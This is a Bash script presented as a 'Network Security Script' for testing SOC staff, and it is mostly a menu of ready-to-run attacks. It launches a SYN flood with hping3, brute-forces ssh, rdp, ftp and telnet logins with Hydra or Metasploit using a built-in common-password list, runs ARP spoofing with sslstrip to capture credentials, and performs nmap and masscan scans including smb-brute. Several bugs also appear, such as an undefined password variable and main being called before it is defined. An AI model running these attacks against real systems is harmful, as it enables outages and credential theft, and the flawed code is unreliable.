#!/bin/bash

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Explanation of the script

echo -e "${BLUE}Welcome to the Network Security Script${NC}"
echo -e "${YELLOW}This script provides various network security functionalities.${NC}"
echo -e "${YELLOW}It allows you to perform DDoS attacks, brute-force attacks, man-in-the-middle attacks, and network scanning.${NC}"
echo -e "${YELLOW}This script can be utilized to monitor the activity of your SOC (Security Operations Center) workers, ensuring they are alert and proficient in their tasks.${NC}"
echo -e "${YELLOW}Here's how it works:${NC}"
echo -e "${GREEN}1. Dependency Check:${NC} The script checks if necessary dependencies like Hydra and Hping3 are installed. If not, it installs them."
echo -e "${GREEN}2. IP Address Display:${NC} It displays the available IP addresses on the network."
echo -e "${GREEN}3. Attack Selection:${NC} You can choose an attack from the available options."
echo -e "${GREEN}4. Target Selection:${NC} Enter the target IP address or choose 'random' for a random target."
echo -e "${GREEN}5. Attack Execution:${NC} Depending on your selection, the script executes the chosen attack."
echo -e "${GREEN}6. Logging:${NC} After the attack, details are logged in the /var/log/attacks.log file for future reference."
echo -e "${GREEN}7. Script Completion:${NC} Finally, the script notifies you that the attack is completed and logged.${NC}"
echo -e " "
echo -e " "

# Define a built-in password list
password_list=(
    "password"
    "123456"
    "12345678"
    "qwerty"
    "123456789"
    "12345"
    "1234"
    "111111"
    "1234567"
    "dragon"
    "123123"
    "baseball"
    "abc123"
    "football"
    "monkey"
    "letmein"
    "696969"
    "shadow"
    "master"
    "666666"
    # Add more passwords as needed
)

# Function to display available attacks
function display_attacks(){
    echo -e "${GREEN}Available Attacks:${NC}"
    echo -e "1. ${YELLOW}DDoS Attack${NC}: Launch a Distributed Denial of Service attack"
    echo -e "2. ${YELLOW}Brute Force Attack${NC}: Attempt to guess passwords"
    echo -e "3. ${YELLOW}Man in the Middle Attack${NC}: Intercept communication between two parties"
    echo -e "4. ${YELLOW}Port Scanning${NC}: Scaning the network of the target"
}

# Function to display IP addresses on the network
function display_ips(){
    echo -e "${BLUE}IP Addresses on the Network:${NC}"
    ifconfig | grep -oE 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -oE '([0-9]*\.){3}[0-9]*'
}

# Function to perform DDoS Attack
function ddos_attack() {
    echo -e "${GREEN}Executing DDoS Attack on $1${NC}"
    echo -e "${YELLOW}Press CTRL+C to stop the attack.${NC}"
    
    sudo hping3 -S --flood -V "$1" 
    
    echo -e "\n${YELLOW}Stopping the attack.${NC}"
}

# Function to perform Brute Force Attack
function brute_force_attack() {
    echo -e "${GREEN}Executing Brute Force Attack on $1${NC}"
    echo -e "${GREEN}remeber that if none of the services is open the attacke want work  ${NC}"
    
    echo -e "${BLUE}Choose the method for brute force attack:${NC}"
    echo -e "1. Hydra"
    echo -e "2. MSFConsole"
    read -p "Enter your choice (1/2): " method_choice
    
    case $method_choice in
        1)
            hydra_brute_force "$1"
            ;;
        2)
            msfconsole_brute_force "$1"
            ;;
        *)
            echo -e "${RED}Invalid choice. Exiting...${NC}"
            exit 1
            ;;
    esac
}

# Function to conduct brute-force attacks using Hydra
function hydra_brute_force() {
    echo -e "${YELLOW}[#] Starting Hydra password brute-force scan...${NC}"

    read -rp "[#] Do you want to use the built-in password list? (yes/no): " use_builtin

    if [[ $use_builtin == "yes" ]]; then
        password_list_used=("${password_list[@]}")
    else
        while true; do
            read -rp "Enter the path to your custom password list file:" custom_password_list
            if [ -f "$custom_password_list" ]; then
                password_list_used=($(<"$custom_password_list"))
                break
            else
                read -rp "Custom password list file not found. Do you want to try again? (yes/no):" try_again
                if [[ $try_again == "no" ]]; then
                    echo -e "${YELLOW}[#] Continuing without custom password list...${NC}"
                    password_list_used=()  # Using an empty list
                    break
                fi
            fi
        done
    fi

    read -rp "[#] Enter the username for brute-force attack: " username

    for protocol in "ssh" "rdp" "ftp" "telnet"; do
        hydra -l "$username" -P "$password" "$protocol://$1" >> brute_force_results.txt 2>&1
    done

    echo -e "${YELLOW}[#] brut force completed. Results saved in brute_force_results.txt.${NC}"
}

# Function to conduct brute-force attacks using MSFConsole
function msfconsole_brute_force() {
    echo -e "${GREEN}Executing MSFConsole brute force attack on $1${NC}"
    
    read -rp "Enter the username for brute-force attack: " username
    read -rp "Enter the path to your custom password list file: " custom_password_list
    
    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $1; set USERNAME $username; set PASS_FILE $custom_password_list; run" 

    echo -e "${YELLOW}finish bruth force${NC}"
}

function mitm_attack() {
    # Prompt user for target IP and gateway IP
    echo -e "${BLUE}Enter the target IP address:${NC}"
    read target_ip
    echo -e "${BLUE}Enter the gateway IP address:${NC}"
    read gateway_ip

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Run arpspoof to perform ARP spoofing
    echo -e "${GREEN}Performing ARP spoofing...${NC}"
    xterm -e "arpspoof -i $(ip route | awk '/default/ { print $5 }') -t $target_ip $gateway_ip" &

    # Create sslstrip.log file
    touch /home/kali/Desktop/sslstrip.log

    # Run sslstrip to strip HTTPS encryption
    echo -e "${GREEN}Running sslstrip...${NC}"
    xterm -e "sslstrip -w /home/kali/Desktop/sslstrip.log -l 8080" &

    # Display intercepted credentials
    echo -e "${GREEN}Intercepted credentials:${NC}"
    tail -f /home/kali/Desktop/sslstrip.log
}


function scan_attack() {
    echo -e "${GREEN}Executing scanning Attack on $1${NC}"
    
    echo -e "${BLUE}Choose the method for scanning attack:${NC}"
    echo -e "1. nmap"
    echo -e "2. masscan"
    read -p "Enter your choice (1/2): " method_choice
    
    case $method_choice in
        1)
            nmap_scan "$1"
            ;;
        2)
            masscan_scan "$1"
            ;;
        *)
            echo -e "${RED}Invalid choice. Exiting...${NC}"
            exit 1
            ;;
    esac
}


# Function to perform Port Scanning using Nmap
function nmap_scan() {
    echo -e "${GREEN}Performing Scanning using Nmap...${NC}"
    
    sudo nmap "$1" -sS -sV -T4 -oN nmap_versions_ports.txt 2>&1 >/dev/null
    echo -e "${GREEN}Nmap versions and ports scanning saved in '${YELLOW}nmap_versions_ports.txt${GREEN}'${NC}"
    
    sudo nmap "$1" --script=default,vuln -oN nmap_vul_results.txt 2>&1 >/dev/null
    echo -e "${GREEN}Nmap vulnerability scanning saved in '${YELLOW}nmap_vul_results.txt${GREEN}'${NC}"
    
    sudo nmap "$1" -p 139,445 --script smb-brute -oN nmap_weak_pass.txt 2>&1 >/dev/null
    echo -e "${GREEN}Nmap weak password scanning saved in '${YELLOW}nmap_weak_pass.txt${GREEN}'${NC}"
}

# Function to perform Port Scanning using Masscan
function masscan_scan() {
    echo -e "${GREEN}Performing Port Scanning using Masscan...${NC}"
    sudo masscan -p1-65535 --rate 10000 "$1" -oL masscan_scan_results.txt 2>&1 >/dev/null
    echo -e "${GREEN}Masscan scanning saved in '${YELLOW}masscan_scan_results.txt${GREEN}'${NC}"
}

# Function to log attacks
function log_attack() {
    echo "$(date) - $1 attack executed on $2" >> /var/log/attacks.log
}

# Function to log attacks
function log_attack() {
    echo "$(date) - $1 attack executed on $2" >> /var/log/attacks.log
}

# Function to check if Hydra is installed, and if not, install it
function check_install_hydra() {
    if ! command -v hydra &> /dev/null; then
        echo -e "${YELLOW}Hydra is not installed. Installing...${NC}"
        sudo apt-get update
        sudo apt-get install hydra -y
        echo -e "${GREEN}Hydra installed successfully.${NC}"
    else
        echo -e "${GREEN}Hydra is already installed.${NC}"
    fi
}

# Function to check if Hping3 is installed, and if not, install it
function check_install_hping3() {
    if ! command -v hping3 &> /dev/null; then
        echo -e "${YELLOW}Hping3 is not installed. Installing...${NC}"
        sudo apt-get update
        sudo apt-get install hping3 -y
        echo -e "${GREEN}Hping3 installed successfully.${NC}"
    else
        echo -e "${GREEN}Hping3 is already installed.${NC}"
    fi
}

function check_install_xterm() {
    if ! command -v xterm &> /dev/null; then
        echo -e "${YELLOW}xterm is not installed. Installing...${NC}"
        sudo apt-get update
        sudo apt-get install xterm -y
        echo -e "${GREEN}xterm installed successfully.${NC}"
    else
        echo -e "${GREEN}xternj is already installed.${NC}"
    fi
}


echo -e "${YELLOW}Do you want to start the Network Security Script? (yes/no)${NC}"
read start_script

if [ "$start_script" == "yes" ]; then
    # Clear the screen before starting the script
    clear
    main >/dev/null
else
    echo -e "${YELLOW}Exiting script...${NC}"
    exit
fi

# Main function
function main() {
   echo -e "${BLUE}checking for needed tools${NC}"
   check_install_hydra
   check_install_hping3
   check_install_xterm
   echo " "
   display_ips
   echo " "
   display_attacks

    echo -e "${BLUE}Choose an attack (1-4) or enter 'random' for a random attack:${NC}"
    read choice

    case $choice in
        1)
            attack="DDoS Attack"
            ;;
        2)
            attack="Brute Force Attack"
            ;;
        3)
            attack="Man in the Middle Attack"
            ;;
        4)
            attack="Port Scanning"
            ;;
        random)
            attack="Attack $((RANDOM % 4 + 1))"
            ;;
        *)
            echo -e "${RED}Invalid choice. Exiting...${NC}"
            exit 1
            ;;
    esac

    # Choose a target
    echo -e "${BLUE}Enter target IP address or enter 'random' for a random target:${NC}"
    read target

    if [ "$target" == "random" ]; then
        # Choose a random IP address (you can implement this)
        target="random_ip"
    fi

    case $attack in
        "DDoS Attack")
            ddos_attack $target
            ;;
        "Brute Force Attack")
            brute_force_attack $target
            ;;
        "Man in the Middle Attack")
            mitm_attack
            ;;
        "Port Scanning")
            scan_attack $target
            ;;
    esac

    log_attack "$attack" "$target"
    echo -e "${GREEN}Attack completed and logged. Log saved in /var/log/attacks.log.${NC}"
}

# Execute main function
main
